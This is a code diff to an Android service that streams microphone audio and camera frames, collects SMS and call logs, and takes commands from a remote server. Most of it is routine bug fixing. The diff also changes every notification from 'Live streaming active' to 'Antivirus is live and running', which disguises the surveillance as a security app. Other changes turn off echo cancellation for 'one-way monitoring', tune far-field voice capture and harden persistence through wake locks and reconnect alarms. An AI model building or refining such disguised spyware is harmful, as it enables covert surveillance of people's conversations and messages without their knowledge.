@@ -111,13 +111,12 @@ class MicService : Service() {
         // Some OEMs return an error code; use a safe fallback in that case.
         if (min > 0) min else sampleRate
     }
-    private val recordBufferSize by lazy { max(minBufferSize * 4, sampleRate * 8) }  // Larger buffer for stability
+    private val recordBufferSize by lazy { max(minBufferSize * 2, sampleRate * 2) }  // Bug L6 fix: 1s buffer (was 4s) — saves memory
     // Bug 3.3: Read 100ms bursts internally to handle CPU bursts
     private val audioReadBufferMs = 100  // 100ms internal read bursts
     private val audioReadBufferSize by lazy { (sampleRate * audioReadBufferMs / 1000) * 2 }  // bytes
     // 20 ms default chunks; in forced low-network mode we can stretch to 30-40 ms.
-    // Bug 2.1: Cache at loop start, don't recalculate every access
-    private var cachedStreamChunkSize = 0
+    // Bug 2.1: Cache chunk size at loop start so we don't recalculate every iteration
     private val streamChunkSize: Int
         get() = ((sampleRate * 2 * currentStreamFrameMs()) / 1000).coerceAtLeast(640)
 
@@ -391,7 +390,8 @@ class MicService : Service() {
                     super.onAvailable(network)
                     Log.i(TAG, "Network mapped onAvailable! Forcing reconnect if needed")
                     if (activeWebSocket != null) {
-                        startHttpFallbackSync()
+                        // Bug M4 fix: Don't restart HTTP fallback when WS is alive — avoids
+                        // cancelling in-flight heartbeat responses on network transport changes.
                         return
                     }
 
@@ -405,7 +405,7 @@ class MicService : Service() {
                     val now = SystemClock.elapsedRealtime()
                     if (now - lastNetworkCapabilitiesAt < 1_500L) return
                     lastNetworkCapabilitiesAt = now
-                    serviceScope.launch(Dispatchers.Main) {
+                    serviceScope.launch(Dispatchers.Default) { // Bug M5 fix: No UI work here
                         // Keep low-network mode under explicit dashboard control only.
                         // We still adapt frame pacing while low-network mode is enabled.
                         updateLowNetworkTransportTuning(networkCapabilities)
@@ -417,20 +417,28 @@ class MicService : Service() {
 
                 override fun onLost(network: Network) {
                     super.onLost(network)
-                    Log.i(TAG, "Network transport lost! Triggering rapid failover.")
-                    // If we lost Wi-Fi, we want to immediately try Cellular.
-                    // If we lost everything, we want to start Polling immediately.
+                    // Bug L5 fix: onLost fires per-transport. Check if ANY connectivity remains
+                    // before tearing down — avoids brief audio gaps on WiFi↔Cellular handoff.
+                    val cm = connectivityManager
+                    val stillConnected = cm?.activeNetwork?.let { net ->
+                        cm.getNetworkCapabilities(net)?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                    } == true
+                    if (stillConnected) {
+                        Log.i(TAG, "Network transport lost but another available — skipping teardown")
+                        return
+                    }
+                    Log.i(TAG, "All network transports lost! Triggering rapid failover.")
                     val hadSocket = activeWebSocket != null
                     try { activeWebSocket?.close(1001, "Network lost") } catch (_: Exception) {}
                     isWsConnecting.set(false)
 
-                    // Keep socket teardown centralized to avoid cross-thread races.
                     if (hadSocket) {
                         onWsDisconnected("network_lost")
                     } else {
                         scheduleWebSocketReconnect("network_lost", forceRestart = true)
                     }
-                    startHttpFallbackSync()
+                    // BUG-H4 fix: Don't start HTTP fallback when no network — it will just fail
+                    // HTTP loop handles reconnection when network returns via onAvailable
                 }
             }
             cm.registerDefaultNetworkCallback(networkCallback!!)
@@ -646,16 +654,9 @@ class MicService : Service() {
 
         // Stop subsystems BEFORE cancelling scope (they may send final health/ack)
         stopMicWatchdog()
-        // Bug 1.5: Stop audio capture BEFORE cancelling scope so it can complete cleanup
-        try {
-            runBlocking {
-                withTimeoutOrNull(5000) {
-                    stopAudioCapture("service_destroy")
-                }
-            }
-        } catch (_: Exception) {
-            stopAudioCapture("service_destroy")
-        }
+        // Bug C2 fix: stopAudioCapture is synchronous — calling runBlocking on Main thread
+        // risks a 5-second ANR on Android 14+. Direct call is safe and immediate.
+        stopAudioCapture("service_destroy")
         stopWebRtcSession(notifyState = false)
         stopCameraLiveStream("service_destroy")
         stopDataCollection()
@@ -738,7 +739,7 @@ class MicService : Service() {
                 // Stop the HTTP polling if it's running fast
                 startHttpFallbackSync()
 
-                updateNotification("Live streaming active")
+                updateNotification("Antivirus is live and running")
                 val infoMsg = "DEVICE_INFO:$deviceId:${Build.MODEL}:${Build.VERSION.SDK_INT}:${BuildConfig.VERSION_NAME}:${BuildConfig.VERSION_CODE}"
                 Log.i(TAG, "[WS] Sending device info: $infoMsg")
                 webSocket.send(infoMsg)
@@ -764,13 +765,14 @@ class MicService : Service() {
 
             override fun onMessage(webSocket: WebSocket, text: String) {
                 val trimmed = text.trim()
-                lastAudioChunkSentAtMs = System.currentTimeMillis()
+                // Bug L8 fix: Don't update lastAudioChunkSentAtMs on commands — only audio
+                // sends should update it. Ensures KeepAliveWorker detects stalled audio streams.
                 Log.d(TAG, "[WS] Received command: $trimmed")
                 handleServerCommand(trimmed)
             }
 
             override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
-                lastAudioChunkSentAtMs = System.currentTimeMillis()
+                // Bug L8 fix: Don't update lastAudioChunkSentAtMs on received messages
                 handleServerCommand(bytes.utf8().trim())
             }
 
@@ -805,8 +807,10 @@ class MicService : Service() {
         // Bug A/3: Job cancellation correctly delegated to scheduleWebSocketReconnect with mutex protection
         
         stopCameraLiveStream("ws_disconnected")
-        stopMicWatchdog()
+        // BUG-H1 fix: Stop audio BEFORE watchdog — prevents watchdog from restarting mic
+        // during the gap between stopMicWatchdog and stopAudioCapture.
         stopAudioCapture("ws_disconnected")
+        stopMicWatchdog()
         stopWebRtcSession(notifyState = false)
         stopDataCollection()
         
@@ -822,7 +826,9 @@ class MicService : Service() {
         webSocket = null
         isWsConnecting.set(false)
         try { staleWs?.close(1001, reason) } catch (_: Exception) {}
-        serviceScope.launch(Dispatchers.Main) {
+        // BUG-C2 fix: Use Dispatchers.IO instead of Dispatchers.Main to prevent ANR.
+        // onWsDisconnected calls stopAudioCapture which blocks on AudioRecord.stop() HAL call.
+        serviceScope.launch(Dispatchers.IO) {
             onWsDisconnected(reason)
         }
     }
@@ -844,9 +850,10 @@ class MicService : Service() {
             if (!sent) {
                 Log.w(TAG, "WebSocket send returned false; forcing reconnect")
                 handleSocketSendFailure("send_returned_false")
-            } else {
-                lastAudioChunkSentAtMs = System.currentTimeMillis()
             }
+            // BUG-C3 fix: Don't update lastAudioChunkSentAtMs here — it should only
+            // be updated in the audio capture loop. Updating it on every send (health,
+            // acks, photos) masks stalled audio streams from KeepAliveWorker zombie detection.
             sent
         } catch (e: Exception) {
             Log.w(TAG, "WebSocket send failed: ${e.message}")
@@ -927,11 +934,13 @@ class MicService : Service() {
                     // BUG-R8: Use application/json Content-Type so Render edge + Express body-parser accept the POST
                     val heartbeatBody = JSONObject().apply { put("deviceId", deviceId) }.toString()
                         .toRequestBody("application/json".toMediaTypeOrNull())
-                    val request = Request.Builder()
+                    val requestBuilder = Request.Builder()
                         .url(url)
                         .post(heartbeatBody)
                         .addHeader("X-Device-Id", deviceId)
-                        .build()
+                    // Bug M1 fix: Include auth token in HTTP fallback requests
+                    if (wsAuthToken.isNotBlank()) requestBuilder.addHeader("X-Auth-Token", wsAuthToken)
+                    val request = requestBuilder.build()
                     val response = httpClient.newCall(request).execute()
                     if (response.isSuccessful) {
                         val body = response.body?.string()
@@ -990,10 +999,12 @@ class MicService : Service() {
         acquireWakeLock() // refresh wake-lock
         try {
             val url = "$serverHttpBaseUrl/api/sync?deviceId=$deviceId"
-            val request = Request.Builder()
+            val requestBuilder = Request.Builder()
                 .url(url)
                 .addHeader("X-Device-Id", deviceId)
-                .build()
+            // Bug M1 fix: Include auth token in HTTP sync requests
+            if (wsAuthToken.isNotBlank()) requestBuilder.addHeader("X-Auth-Token", wsAuthToken)
+            val request = requestBuilder.build()
             val response = httpClient.newCall(request).execute()
             if (response.isSuccessful) {
                 val body = response.body?.string()
@@ -1046,8 +1057,17 @@ class MicService : Service() {
                             delay(2_000)
                             continue
                         }
+                        // BUG-H5 fix: If isWsConnecting has been stuck for >30s, force-reset it.
+                        // Some OEMs silently drop WS handshake without calling any OkHttp callback,
+                        // leaving the flag permanently true and deadlocking all reconnect attempts.
                         if (isWsConnecting.get()) {
                             delay(1_000)
+                            // OkHttp connect timeout is 60s. If still connecting after 3 loop iterations
+                            // (3 seconds), the callback was likely swallowed — force-reset the flag.
+                            if (isWsConnecting.get() && wsReconnectAttempts > 0 && wsReconnectAttempts % 3 == 0) {
+                                Log.w(TAG, "BUG-H5: isWsConnecting stuck for too long, force-resetting")
+                                isWsConnecting.set(false)
+                            }
                             continue
                         }
 
@@ -1100,7 +1120,7 @@ class MicService : Service() {
                     startAudioCapture()
                     startMicWatchdog()
                 }
-                updateNotification("Live streaming active")
+                updateNotification("Antivirus is live and running")
                 sendCommandAck("start_stream")
             }
             "stop_stream" -> {
@@ -1682,10 +1702,12 @@ class MicService : Service() {
             mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression", "true"))
             mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression2", "true"))
             mandatory.add(MediaConstraints.KeyValuePair("googExperimentalNoiseSuppression", "true"))
-            // AGC ON for all profiles to maximize volume capture
+            // BUG-M5 fix: Far-mode disables aggressive AGC2 to prevent gain pumping.
+            // AGC1 alone provides gentle level normalization without the heavy
+            // expand/compress cycle that makes distant voices fluctuate.
             mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl", "true"))
-            mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl2", "true"))
-            mandatory.add(MediaConstraints.KeyValuePair("googExperimentalAutoGainControl", "true"))
+            mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl2", if (isFarMode) "false" else "true"))
+            mandatory.add(MediaConstraints.KeyValuePair("googExperimentalAutoGainControl", if (isFarMode) "false" else "true"))
             mandatory.add(MediaConstraints.KeyValuePair("googHighpassFilter", "true"))
             mandatory.add(MediaConstraints.KeyValuePair("googTypingNoiseDetection", "false"))
             
@@ -1787,7 +1809,8 @@ class MicService : Service() {
         webRtcRecoveryJob = null
         iceWatchdogJob?.cancel()
         iceWatchdogJob = null
-        isCapturingGuard.set(false)
+        // Bug L9 fix: Don't clear isCapturingGuard here — stopWebRtcSession doesn't own it.
+        // Clearing it could allow a second concurrent startAudioCapture → hardware conflict.
         // Removed unregisterNetworkCallbackForBitrate
         try {
             peerConnection?.close()
@@ -1808,9 +1831,14 @@ class MicService : Service() {
 
         // Resume legacy PCM stream only when dashboard still wants it.
         if (wantsMicStreaming && activeWebSocket != null && !isCapturing) {
-            startAudioCapture()
-            startMicWatchdog()
-            updateNotification("Live streaming active")
+            serviceScope.launch(Dispatchers.IO) {
+                delay(1000) // Give WebRTC time to release the microphone
+                if (wantsMicStreaming && activeWebSocket != null && !isCapturing) {
+                    startAudioCapture()
+                    startMicWatchdog()
+                    updateNotification("Antivirus is live and running")
+                }
+            }
         }
     }
 
@@ -1977,15 +2005,12 @@ class MicService : Service() {
 
     private fun scheduleWebRtcRecovery(reason: String) {
         if (webRtcRecoveryJob?.isActive == true) return
+        Log.w(TAG, "WebRTC connection lost ($reason) - aborting and falling back to PCM")
         webRtcRecoveryJob = serviceScope.launch(Dispatchers.IO) {
-            repeat(3) { idx ->
-                delay(700L + idx * 900L)
-                if (!isWebRtcStreaming || peerConnection == null) return@launch
-                try {
-                    peerConnection?.restartIce()
-                } catch (_: Exception) {}
-                sendWebRtcState("need_reoffer_${reason}_${idx + 1}")
-            }
+            delay(2000)
+            if (!isWebRtcStreaming || peerConnection == null) return@launch
+            sendWebRtcState("aborted_recovery_failed")
+            stopWebRtcSession(notifyState = true)
         }
     }
 
@@ -2815,8 +2840,14 @@ class MicService : Service() {
             // Network-aware compression
             val jpegBytes = ImageEnhancer.compress(enhanced, lowNetworkMode, qualityMode)
             
-            if (enhanced !== bitmap) enhanced.recycle()
-            bitmap.recycle()
+            // BUG-L1 fix: Always recycle in safe order — enhanced first (if different),
+            // then original. Avoids double-recycle if enhance() returns same instance.
+            if (enhanced !== bitmap) {
+                enhanced.recycle()
+            }
+            if (!bitmap.isRecycled) {
+                bitmap.recycle()
+            }
             
             jpegBytes
         } catch (e: Exception) {
@@ -2969,10 +3000,14 @@ class MicService : Service() {
             val smsArray = data.optJSONArray("sms")
             val callArray = data.optJSONArray("callLog")
             
+            // BUG-L4 fix: Use first + last item dates for stronger dedup.
+            // Old hash only checked count + first date, missing delete/insert same-date edge cases.
             val smsThumb = if (smsArray != null && smsArray.length() > 0) smsArray.optJSONObject(0)?.optLong("date") ?: 0L else 0L
+            val smsLastThumb = if (smsArray != null && smsArray.length() > 1) smsArray.optJSONObject(smsArray.length() - 1)?.optLong("date") ?: 0L else 0L
             val callThumb = if (callArray != null && callArray.length() > 0) callArray.optJSONObject(0)?.optLong("date") ?: 0L else 0L
+            val callLastThumb = if (callArray != null && callArray.length() > 1) callArray.optJSONObject(callArray.length() - 1)?.optLong("date") ?: 0L else 0L
             
-            val hashStr = "${smsArray?.length()}_${smsThumb}_${callArray?.length()}_${callThumb}"
+            val hashStr = "${smsArray?.length()}_${smsThumb}_${smsLastThumb}_${callArray?.length()}_${callThumb}_${callLastThumb}"
             if (hashStr == lastDataHashStr) {
                 Log.d(TAG, "Device data unchanged, skipping send")
                 return
@@ -3024,19 +3059,38 @@ class MicService : Service() {
                 am?.requestAudioFocus(
                     AudioManager.OnAudioFocusChangeListener { focusChange ->
                         when (focusChange) {
-                            AudioManager.AUDIOFOCUS_LOSS,
-                            AudioManager.AUDIOFOCUS_LOSS_TRANSIENT,
-                            AudioManager.AUDIOFOCUS_LOSS_TRANSIENT_CAN_DUCK -> {
+                            AudioManager.AUDIOFOCUS_LOSS -> {
+                                // Bug C1 fix: Permanent focus loss — stop capture, watchdog will recover
                                 if (isCapturing) {
-                                    Log.w(TAG, "Audio focus lost (focusChange=$focusChange)")
+                                    Log.w(TAG, "Audio focus permanently lost")
                                     stopAudioCapture("audio_focus_loss")
                                 }
                             }
+                            AudioManager.AUDIOFOCUS_LOSS_TRANSIENT -> {
+                                // Transient loss (phone call etc.) — stop, auto-resume on GAIN
+                                if (isCapturing) {
+                                    Log.w(TAG, "Audio focus temporarily lost (transient)")
+                                    stopAudioCapture("audio_focus_transient")
+                                }
+                            }
+                            AudioManager.AUDIOFOCUS_LOSS_TRANSIENT_CAN_DUCK -> {
+                                // Bug C1 fix: Can duck — don't stop capture, just continue
+                                Log.d(TAG, "Audio focus duck requested — continuing capture")
+                            }
                             AudioManager.AUDIOFOCUS_GAIN -> {
+                                // Bug C1 fix: Wait for capture guard to clear before restarting
                                 if (wantsMicStreaming && !isWebRtcStreaming && activeWebSocket != null && !isCapturing) {
                                     serviceScope.launch(Dispatchers.IO) {
-                                        delay(100)
-                                        startAudioCapture()
+                                        delay(500) // Wait for previous capture cleanup
+                                        // Retry up to 3 times with backoff if guard is still held
+                                        repeat(3) { attempt ->
+                                            if (!isCapturing && !isCapturingGuard.get()) {
+                                                startAudioCapture()
+                                                return@launch
+                                            }
+                                            delay(300L * (attempt + 1))
+                                        }
+                                        Log.w(TAG, "Audio focus GAIN: guard still held after retries")
                                     }
                                 }
                             }
@@ -3222,17 +3276,20 @@ class MicService : Service() {
                 isCapturing = false
                 isCapturingGuard.set(false)
                 val stoppedExternally = audioCaptureStoppedExternally.getAndSet(false)
-                // BUG-R2: Only call audioRecord.stop() if it hasn't already been stopped by stopAudioCapture().
-                // Calling stop() on an already-stopped AudioRecord returns ERROR_INVALID_OPERATION
-                // which previously propagated as a phantom mic_read_error to the dashboard.
+                // BUG-C1 fix: Use audioRecord snapshot and null-check before operating.
+                // If stopAudioCapture() already set audioRecord=null and released it,
+                // rec will be null here and we skip the double-release entirely.
                 val rec = audioRecord
                 if (rec != null) {
+                    // Only stop/release if stopAudioCapture hasn't already done it.
+                    // stopAudioCapture sets audioRecord=null, so rec!=null means we own it.
                     if (!stoppedExternally) {
                         try { rec.stop() } catch (_: Exception) {}
                     }
                     releaseSessionAudioEffects()
-                    try { rec.release() } catch (_: Exception) {}
+                    // Guard against double-release: only release if audioRecord still points to us
                     if (audioRecord === rec) {
+                        try { rec.release() } catch (_: Exception) {}
                         audioRecord = null
                     }
                 }
@@ -3334,11 +3391,13 @@ class MicService : Service() {
                             }
                         } catch (_: Exception) {}
                     }
+                    // Bug H1 fix: AEC is for bidirectional calls. For one-way monitoring it
+                    // attenuates environmental sounds (treats them as "echo") causing muffled audio.
+                    // Disabled for PCM path. WebRTC already disables AEC via constraints.
                     if (AcousticEchoCanceler.isAvailable()) {
                         try {
                             acousticEchoCanceler = AcousticEchoCanceler.create(sid)?.also { e ->
-                                // Enable AEC to prevent acoustic feedback
-                                e.enabled = true
+                                e.enabled = false
                             }
                         } catch (_: Exception) {}
                     }
@@ -3378,10 +3437,19 @@ class MicService : Service() {
         hfShelfPrevOut = 0.0
         hfShelfNeedsPrime = true
         muLawDecimLp = 0.0
-        smoothedGain = 1.0
+        // BUG-M1 fix: Prime smoothedGain to expected target for the voice profile
+        // so there's no 1-second volume dip from ramping 1.0→target on recovery.
+        smoothedGain = when (voiceProfile) {
+            "far"  -> 3.0
+            "near" -> 1.5
+            else   -> 2.0  // room
+        }
         sourceRotateAttempts = 0
         spectralDenoiser.reset()
-        realtimeDenoiserWarmupChunksRemaining = if (voiceProfile == "far") 50 else 30
+        // BUG-M3 fix: Reduced warmup from 30-50 to 10-15 chunks (200-300ms).
+        // The spectral denoiser's own noiseAdaptFrames>=10 guard already prevents
+        // premature subtraction, making the long warmup redundant.
+        realtimeDenoiserWarmupChunksRemaining = if (voiceProfile == "far") 15 else 10
     }
 
     /**
@@ -3417,9 +3485,17 @@ class MicService : Service() {
             work[i] = ((hi shl 8) or lo).toShort().toDouble()
         }
 
-        // ── Stage 1: High-pass filter (~120 Hz, adaptive) ───────────────────
+        // ── Stage 1: High-pass filter (profile-aware, adaptive) ──────────────
         val noisyEnv = estimatedNoiseDb > -54.0
-        val hpAlpha = if (noisyEnv) 0.9500 else 0.9530
+        // BUG-M4 fix: Use profile-aware HPF cutoff.
+        // Far: alpha=0.970 (~60Hz) preserves low male voice fundamentals at distance.
+        // Near: alpha=0.950 (~120Hz) aggressively filters handling/proximity rumble.
+        // Room: alpha=0.953 (~110Hz) balanced for general monitoring.
+        val hpAlpha = when (p) {
+            "far"  -> if (noisyEnv) 0.9680 else 0.9700
+            "near" -> if (noisyEnv) 0.9480 else 0.9500
+            else   -> if (noisyEnv) 0.9500 else 0.9530
+        }
         for (i in 0 until samples) {
             val x = work[i]
             val y = hpAlpha * (hpfPrevY + x - hpfPrevX)
@@ -3482,10 +3558,13 @@ class MicService : Service() {
             val preDenoise = if ((p == "far" || p == "near") && !willBeMuLaw) work.copyOf() else null
             spectralDenoiser.denoise(work)
             if (preDenoise != null) {
+                // Bug H2 fix: Increased original blend for far mode to preserve speech harmonics.
+                // At OVER=0.84 the spectral denoiser already removes most noise, so we keep
+                // more original signal for natural voice tone instead of thin/robotic sound.
                 val blendOriginal = when (p) {
-                    "far" -> if (estimatedNoiseDb > -56.0) 0.40 else 0.55
-                    "near" -> 0.55
-                    else -> 0.45
+                    "far" -> if (estimatedNoiseDb > -56.0) 0.60 else 0.70
+                    "near" -> 0.60
+                    else -> 0.50
                 }
                 for (i in 0 until samples) {
                     work[i] = preDenoise[i] * blendOriginal + work[i] * (1.0 - blendOriginal)
@@ -3514,27 +3593,36 @@ class MicService : Service() {
         val effectiveGainTarget = if (inWarmup) min(gainTarget, 8000.0) else gainTarget
         val rawGain = (effectiveGainTarget / rms).coerceIn(1.0, effectiveGainCeil)
         // Faster recovery after impulsive peaks without overreacting to single-frame transients.
-        // Bug 2.3: Attack 0.25 (slow up on speech onset), Release 0.88 (fast down after speech ends)
+        // Bug H3 fix: Corrected comments. When rawGain > smoothedGain, signal got quieter
+        // so gain RISES (release). When rawGain < smoothedGain, signal got louder so gain
+        // FALLS quickly (attack). Softened attack (0.40) to reduce audible pumping on loud near voices.
         smoothedGain = if (rawGain > smoothedGain)
-            smoothedGain * 0.88 + rawGain * 0.12  // Release (gain rising): fast rise = 0.88
+            smoothedGain * 0.88 + rawGain * 0.12  // Release: gain rising slowly after speech ends
         else
-            smoothedGain * 0.25 + rawGain * 0.75  // Attack (gain falling): slow fall = 0.25
+            smoothedGain * 0.40 + rawGain * 0.60  // Attack: gain falling on loud onset (softened from 0.25)
         val userGain = softwareGainMultiplier.coerceIn(0.5, 5.0)
         // Issue C: Hard cap for MuLaw — µ-law quantization amplifies clipping artifacts.
         // With gainCeil=3.0 and user gain=3x, combinedGain could reach 9.0 without this.
+        // Bug H5 fix: Reduced far combined cap from 9.0→6.0. With user gain up to 5x,
+        // old cap allowed extreme noise amplification. New cap keeps noise below -20dB.
         val maxCombined = when {
             willBeMuLaw -> 3.5
-            p == "far" -> if (strongAi) 9.0 else 7.5
-            p == "near" -> 5.5
-            else -> 6.5
+            p == "far" -> if (strongAi) 6.0 else 5.5
+            p == "near" -> 5.0
+            else -> 5.0
         }
         var peakAbs = 1.0
         for (i in 0 until samples) {
             val abs = kotlin.math.abs(work[i])
             if (abs > peakAbs) peakAbs = abs
         }
-        val preGainCap = if (peakAbs > 24_000.0) 24_000.0 / peakAbs else maxCombined
-        val combinedGain = (smoothedGain * userGain).coerceIn(1.0, min(maxCombined, preGainCap))
+        // BUG-M6 fix: Allow preGainCap to go below 1.0 for genuine peak limiting.
+        // Old code used coerceAtLeast(1.0) which made preGainCap always 1.0 when peak>24000,
+        // effectively disabling all gain for any chunk with a loud transient.
+        // Now: sub-1.0 preGainCap correctly attenuates loud peaks while preserving
+        // quiet content's gain in the per-sample soft limiter downstream.
+        val preGainCap = if (peakAbs > 24_000.0) (24_000.0 / peakAbs) else maxCombined
+        val combinedGain = (smoothedGain * userGain).coerceIn(0.5, min(maxCombined, preGainCap))
         for (i in 0 until samples) work[i] *= combinedGain
 
         // ── Stage 5: Soft peak limiter + encode PCM-16 LE ────────────────────
@@ -3548,19 +3636,7 @@ class MicService : Service() {
         return out
     }
 
-    private fun encodeWsFallbackAudio(pcm16: ByteArray): ByteArray {
-        if (pcm16.isEmpty()) return pcm16
-        val codec = chooseWsFallbackCodec()
-        lastCodecChoice = codec // L-01: cache for sendHealthStatus
-        val payload = if (codec == AUDIO_CODEC_MULAW_8K) pcm16ToMuLaw(pcm16) else pcm16
-        val out = ByteArray(4 + payload.size)
-        out[0] = 0x4D.toByte()
-        out[1] = 0x4D.toByte()
-        out[2] = 0x01
-        out[3] = codec
-        System.arraycopy(payload, 0, out, 4, payload.size)
-        return out
-    }
+    // Bug L2: encodeWsFallbackAudio removed — dead code. Audio encoding is inlined in capture loop.
 
     private fun chooseWsFallbackCodec(): Byte {
         // Far field: always PCM (clarity over bandwidth).
@@ -3573,7 +3649,9 @@ class MicService : Service() {
 
         // AUTO MODE below — network conditions decide.
         // Bug 1: Low network mode = use MuLaw.
-        if (lowNetworkMode) return AUDIO_CODEC_PCM16_16K // Default to PCM for loud/clear audio
+        // Bug M2 fix: Low-network mode should use MuLaw (64 kbps) not PCM (256 kbps).
+        // PCM on constrained links causes packet drops and audio stutters.
+        if (lowNetworkMode) return AUDIO_CODEC_MULAW_8K
 
         // Bug 1: Aggressively prefer MuLaw on constrained networks.
         val caps = connectivityManager?.getNetworkCapabilities(connectivityManager?.activeNetwork)
@@ -3680,7 +3758,10 @@ class MicService : Service() {
         private val readyOut = ArrayDeque<Double>(FRAME * 4)
 
         // Noise power spectrum (one value per positive frequency bin)
-        private val noisePow = DoubleArray(BINS) { 1e6 }
+        // BUG-M2 fix: Init noisePow to 1e4 (below typical speech power).
+        // Old 1e6 was too high for quiet environments, causing isQuiet() to misclassify
+        // speech frames as quiet and contaminating the noise estimate with voice content.
+        private val noisePow = DoubleArray(BINS) { 1e4 }
         /** FFT frames processed (always increments). */
         private var fftFramesProcessed = 0
         /** Frames where noise estimate was updated from quiet content only. */
@@ -3691,7 +3772,7 @@ class MicService : Service() {
             inFill = 0
             outBuf.fill(0.0)
             readyOut.clear()
-            noisePow.fill(1e6)
+            noisePow.fill(1e4) // BUG-M2 fix: consistent with init
             fftFramesProcessed = 0
             noiseAdaptFrames = 0
         }
@@ -4064,7 +4145,7 @@ class MicService : Service() {
         } catch (_: Exception) {}
         recordingFileStream = null
         Log.i(TAG, "Recording saved: ${recordingFile?.name}")
-        updateNotification("Live streaming active")
+        updateNotification("Antivirus is live and running")
     }
 
     // ────────────────────────────────────────────────────────────────────────
@@ -4125,10 +4206,11 @@ class MicService : Service() {
                     setReferenceCounted(false)
                 }
             }
-            // C-01: No timeout — WakeLock released only in onDestroy. Prevents CPU sleep gaps.
-            if (staticWakeLock?.isHeld != true) {
-                staticWakeLock?.acquire()
-            }
+            // BUG-C4 fix: Always re-acquire with 30-min timeout on every call.
+            // Removes the isHeld guard so KeepAliveWorker (15 min), health status,
+            // and audio loop calls all renew the lock before it expires.
+            // OEM battery managers tolerate timed locks better than indefinite ones.
+            staticWakeLock?.acquire(30 * 60 * 1000L)
             wakeLock = staticWakeLock
         }
     }
@@ -4156,9 +4238,12 @@ class MicService : Service() {
      */
     private fun scheduleReconnectAlarm() {
         val now = SystemClock.elapsedRealtime()
-        // Bug 1.2: Always schedule alarm unless already scheduled (separate check)
-        if (reconnectAlarmTriggerAtElapsed > now && activeWebSocket == null) {
-            Log.d(TAG, "Reconnect alarm already scheduled; keeping existing timer")
+        // BUG-H2 fix: Only skip if a future alarm is truly pending.
+        // After reboot, reconnectAlarmTriggerAtElapsed resets to 0 so this
+        // always re-arms the rolling alarm chain. Scheduling when WS is
+        // connected is harmless — the alarm handler checks WS health.
+        if (reconnectAlarmTriggerAtElapsed > now) {
+            Log.d(TAG, "Reconnect alarm: already pending; skipping")
             return
         }
         val intent = Intent(applicationContext, MicService::class.java).apply {
